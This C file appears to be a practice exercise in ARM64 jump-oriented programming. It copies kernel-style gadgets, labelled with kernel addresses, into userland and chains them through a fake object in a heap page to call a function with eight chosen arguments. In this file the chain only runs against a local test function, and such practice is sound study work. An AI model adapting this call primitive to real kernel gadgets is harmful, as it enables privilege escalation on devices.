#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

//0xFFFFFFF006999380
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp x5, x8, [x0, #0x10] \n"
        "ldp x1, x2, [x0, #0x20] \n" 
        "ldp x3, x4, [x0, #0x30] \n" 
        "mov x0, x8 \n"
        "br x5 \n"
    );
}

//0xFFFFFFF00656B634
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n" 
        "stp x29, x30, [sp, #0x10]\n" 
        "add x29, sp, #0x10\n"        
        "mov x19, x1\n"                
        "ldr x0, [x0, #0x98]\n"          
        "ldr x8, [x0]\n"               
        "ldr x8, [x8, #0x7C0]\n"      
        "blr x8\n"                    
        "str x0, [x19]\n"             
        "mov w0, #0\n"               
        "ldp x29, x30, [sp, #0x10]\n"   
        "ldp x20, x19, [sp], #0x20\n"   
        "ret\n"
    );
}

//0xFFFFFFF0064231C4
__attribute__((naked)) void mov_x16_x1__br_x2(void) {
    __asm__ volatile (
        "mov x16, x1\n"
        "br x2\n"
    );
}

//0xFFFFFFF0064DD47C
__attribute__((naked)) void mov_x15_x3__br_x4(void) {
    __asm__ volatile (
        "mov x15, x3\n"
        "br x4\n"
    );
}

__attribute__((naked)) void mov_x7_x16__br_x2(void) {
    __asm__ volatile (
        "mov x7, x16\n"
        "br x2\n"
    );
}

__attribute__((naked)) void mov_x16_x3__br_x4(void) {
    __asm__ volatile (
        "mov x16, x3\n"
        "br x4\n"
    );
}

__attribute__((naked)) void mov_x5_x16__br_x15(void) {
    __asm__ volatile (
        "mov x5, x16\n"
        "br x15\n"
    );
}

__attribute__((naked)) void mov_x012345__br_x6(void) {
    __asm__ volatile (
        "mov x0, x1\n"
        "mov x1, x2\n"
        "mov x2, x3\n"
        "mov x3, x4\n"
        "mov x4, x5\n"
        "br x6\n"
    );
}

__attribute__((naked)) void mov_x0_x3__br_x4(void) {
    __asm__ volatile (
        "mov x0, x3\n"
        "br x4\n"
    );
}

__attribute__((naked)) void mov_x0123__br_x4(void) {
    __asm__ volatile (
        "mov x0, x1\n"
        "mov x1, x2\n"
        "mov x2, x3\n"
        "br x4\n"
    );
}

__attribute__((naked)) void br_x6(void) {
    __asm__ volatile (
        "br x6\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size); 
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, addr, size);

    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    //TODO: call func_arg8 using addr
    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) = 
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    write64(my_page, my_page);
    write64(my_page + 0x98, my_page);
    write64(my_page + 0x7c0, gadget_populate);
    write64(my_page + 0x10, mov_x16_x1__br_x2);
    write64(my_page + 0x18, my_page + 0x800);
    write64(my_page + 0x20, x7);
    write64(my_page + 0x28, mov_x15_x3__br_x4);
    write64(my_page + 0x30, addr);
    write64(my_page + 0x38, gadget_populate);

    write64(my_page + 0x810, mov_x7_x16__br_x2);
    write64(my_page + 0x818, my_page + 0x840);
    write64(my_page + 0x820, 0);
    write64(my_page + 0x828, mov_x16_x3__br_x4);
    write64(my_page + 0x830, x5);
    write64(my_page + 0x838, gadget_populate);
    write64(my_page + 0x850, mov_x5_x16__br_x15);
    write64(my_page + 0x858, x0);
    write64(my_page + 0x860, x1);
    write64(my_page + 0x868, x2);
    write64(my_page + 0x870, x3);
    write64(my_page + 0x878, x4);
    
    uint64_t STORED_RET = my_page + 0x100;
    uint64_t ret2 = my_call6(gadget_populate, my_page, STORED_RET, 0, 0, 0, 0, 0);

    // hexdump(my_page, 0x1000);

    uint64_t ret = read64(STORED_RET);

    return ret;
}


int main(int argc, char *argv[], char *envp[]) {
#if 0 
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6(func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop(func_arg8, 0xdeadbeef41424340, 0xdeadbeef41424341, 0xdeadbeef41424342, 0xdeadbeef41424343, 0xdeadbeef41424344, 0xdeadbeef41424345, 0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);

    return 0;
}